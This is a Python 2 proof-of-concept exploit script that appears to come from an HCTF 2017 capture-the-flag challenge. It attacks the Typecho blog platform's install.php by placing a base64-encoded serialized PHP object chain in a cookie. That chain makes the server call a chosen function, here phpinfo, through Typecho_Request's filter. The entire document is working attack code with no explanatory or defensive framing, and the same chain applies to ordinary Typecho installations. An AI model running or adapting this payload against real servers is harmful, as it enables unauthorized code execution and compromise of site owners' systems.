import requests

def poc(url):
	url = url if url.startswith('http://') else 'http://'+url
	print url
	target = url+'/install.php?finish'
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
		'Referer':'http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017//install.php',
		'cookie':"__typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9"
		}
	try:
		html = requests.get(url=target,headers=headers,timeout=3)
		if html.status_code == 404:
			return 'the file install.php is not exists'
		print html.content
	except Exception  ,e:
		print e
		return False


if __name__ == '__main__':
	url = 'http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/'
	poc(url)
	